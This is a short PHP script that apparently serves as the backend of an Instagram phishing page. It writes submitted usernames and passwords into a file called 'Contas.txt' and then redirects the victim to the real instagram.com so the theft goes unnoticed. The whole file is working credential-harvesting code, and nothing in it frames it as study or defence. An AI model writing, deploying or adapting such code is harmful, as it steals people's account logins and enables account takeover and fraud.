<?php

file_put_contents("Contas.txt", "Email: " . $_GET['username'] . " Senha: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
